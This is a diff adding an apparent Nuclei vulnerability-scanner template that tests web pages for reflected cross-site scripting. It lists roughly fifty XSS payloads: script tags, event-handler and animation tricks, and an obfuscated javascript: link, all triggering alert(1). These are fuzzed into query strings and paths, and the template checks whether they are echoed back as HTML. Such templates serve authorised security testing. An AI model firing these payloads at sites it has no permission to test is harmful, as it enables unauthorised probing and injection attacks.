@@ -1,0 +1,93 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<IMG SRC=x onfocusout=alert(String.fromCharCode(88,83,83))//\">"
+        - "<style>:target {color:red;}</style><menu id=x style=\"transition:color 1s\" ontransitioncancel=alert(1)></menu>"
+        - "<menu id=x tabindex=1 onfocusin=alert(1)></menu><input autofocus>"
+        - "<IMG SRC=x onkeydown=\"alert(String.fromCharCode(88,83,83))\">"
+        - "<script>alert('XSS');</script>"
+        - "<svg><title draggable=\"true\" ondragend=\"alert(1)\">test</title></svg>"
+        - "<script>alert(1)</script>"
+        - "<iframe src=\"http://yoursite.com/some_file.html\" style=\"border:none;\">"
+        - "<colgroup draggable=\"true\" ondragend=\"alert(1)\">test</colgroup>"
+        - "<style>:target {color:red;}</style><progress id=x style=\"transition:color 1s\" ontransitioncancel=alert(1)></progress>"
+        - "<html draggable=\"true\" ondragend=\"alert(1)\">test</html>"
+        - "<body onload=\"javascript:alert(1)\">"
+        - "<style>:target {color:red;}</style><div id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></div>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><bdi ondrop=alert(1) contenteditable>drop here</bdi>"
+        - "<applet draggable=\"true\" ondragend=\"alert(1)\">test</applet>"
+        - "<style>:target {color:red;}</style><img id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)>"
+        - "<mark onmousemove=\"alert(1)\">test</mark>"
+        - "<svg><script>alert(1)</script></svg>"
+        - "<output id=x tabindex=1 onbeforeactivate=alert(1)></output><input autofocus>"
+        - "<input onpaste=\"alert(1)\" contenteditable>test</input>"
+        - "<style>:target {color:red;}</style><progress id=x style=\"transition:color 1s\" ontransitioncancel=alert(1)></progress>"
+        - "<plaintext id=x tabindex=1 onactivate=alert(1)></plaintext>"
+        - "<script>alert('XSS')</script>"
+        - "<IMG SRC=x onblur=alert(1)><IMG SRC=x onfocusin=alert(1)>"
+        - "<aside id=x tabindex=1 onfocusin=alert(1)></aside><input autofocus>"
+        - "<basefont onblur=alert(1) tabindex=1 id=x></basefont><input autofocus>"
+        - "<tt onfocusin=alert(1) id=x></tt>"
+        - "<xmp id=x tabindex=1 onfocusin=alert(1)></xmp>"
+        - "<svg><img onload=alert(1)>//"
+        - "<svg><style>@keyframes x{}</style><audio style=\"animation-name:x\" onanimationstart=\"alert(1)\"></audio>"
+        - "<svg draggable=\"true\" ondragend=\"alert(1)\">test</svg>"
+        - "<details draggable=\"true\" ondragend=\"alert(1)\">test</details>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></a>"
+        - "<basefont onkeydown=\"alert(1)\" contenteditable>test</basefont>"
+        - "<mark onkeypress=\"alert(1)\" contenteditable>test</mark>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><dialog ondrop=alert(1) contenteditable>drop here</dialog>"
+        - "<form><textarea cols=\"50\" rows=\"10\"></textarea></form>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><kbd ondrop=alert(1) contenteditable>drop here</kbd>"
+        - "<xmp id=x tabindex=1 onactivate=alert(1)></xmp>"
+        - "<video autoplay controls onpause=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>"
+        - "<sub id=x tabindex=1 ondeactivate=alert(1)></sub><input id=y autofocus>"
+        - "<form id=x tabindex=1 ondeactivate=alert(1)></form><input autofocus>"
+        - "<frame id=x tabindex=1 ondeactivate=alert(1)></frame><input id=y autofocus>"
+        - "<frame onkeyup=\"alert(1)\" contenteditable>test</frame>"
+        - "<style>:target {color:red;}</style><progress id=x style=\"transition:color 1s\" ontransitioncancel=alert(1)></progress>"
+        - "<a href=\"javas\\x07cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
+        - "<style>@keyframes slidein {}</style><kbd style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></kbd>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
